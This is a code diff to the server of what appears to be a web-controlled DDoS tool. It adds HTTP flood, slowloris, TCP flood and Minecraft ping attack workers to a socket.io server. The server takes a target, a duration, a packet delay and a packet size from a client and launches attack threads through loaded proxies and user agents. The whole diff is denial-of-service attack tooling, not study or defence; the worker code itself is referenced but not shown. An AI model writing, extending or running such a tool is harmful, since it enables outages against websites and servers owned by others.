@@ -5,12 +5,16 @@ import { Server } from "socket.io";
 import { fileURLToPath } from "url";
 import { Worker } from "worker_threads";
 
-import { loadProxies, loadUserAgents } from "./utils/fileLoader.js";
-import { filterProxies } from "./utils/proxyUtils.js";
+import { loadProxies, loadUserAgents } from "./fileLoader";
+import { AttackMethod } from "./lib";
+import { filterProxies } from "./proxyUtils";
 
 // Define the workers based on attack type
-const attackWorkers = {
-  http: "./workers/httpAttack.js",
+const attackWorkers: { [key in AttackMethod]: string } = {
+  http_flood: "./workers/httpFloodAttack.js",
+  http_slowloris: "./workers/httpSlowlorisAttack.js",
+  tcp_flood: "./workers/tcpFloodAttack.js",
+  minecraft_ping: "./workers/minecraftPingAttack.js",
 };
 
 const __filename = fileURLToPath(import.meta.url);
@@ -25,8 +29,8 @@ const io = new Server(httpServer, {
   },
 });
 
-const proxies = loadProxies(join(__dirname, "../data/proxies.txt"));
-const userAgents = loadUserAgents(join(__dirname, "../data/uas.txt"));
+const proxies = loadProxies();
+const userAgents = loadUserAgents();
 
 console.log("Proxies loaded:", proxies.length);
 console.log("User agents loaded:", userAgents.length);
@@ -42,7 +46,7 @@ io.on("connection", (socket) => {
   });
 
   socket.on("startAttack", (params) => {
-    const { target, duration, packetDelay, attackMethod } = params;
+    const { target, duration, packetDelay, attackMethod, packetSize } = params;
     const filteredProxies = filterProxies(proxies, attackMethod);
     const attackWorkerFile = attackWorkers[attackMethod];
 
@@ -65,32 +69,37 @@ io.on("connection", (socket) => {
         userAgents,
         duration,
         packetDelay,
+        packetSize,
       },
     });
 
     worker.on("message", (message) => socket.emit("stats", message));
+
     worker.on("error", (error) => {
       console.error(`Worker error: ${error.message}`);
       socket.emit("stats", { log: `❌ Worker error: ${error.message}` });
     });
+
     worker.on("exit", (code) => {
       console.log(`Worker exited with code ${code}`);
       socket.emit("attackEnd");
     });
 
-    socket.worker = worker;
+    socket["worker"] = worker;
   });
 
   socket.on("stopAttack", () => {
-    if (socket.worker) {
-      socket.worker.terminate();
+    const worker = socket["worker"];
+    if (worker) {
+      worker.terminate();
       socket.emit("attackEnd");
     }
   });
 
   socket.on("disconnect", () => {
-    if (socket.worker) {
-      socket.worker.terminate();
+    const worker = socket["worker"];
+    if (worker) {
+      worker.terminate();
     }
     console.log("Client disconnected");
   });
